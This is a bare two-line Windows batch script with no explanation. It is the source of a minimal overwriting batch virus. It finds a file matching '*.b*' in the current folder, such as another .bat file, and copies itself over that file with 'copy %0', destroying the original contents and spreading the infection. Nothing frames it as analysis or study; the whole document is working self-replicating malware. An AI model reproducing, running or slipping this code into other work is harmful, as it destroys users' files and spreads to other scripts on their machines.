for %%a in (*.b*) do set a=%%a
ren %a% *|copy %0 %a%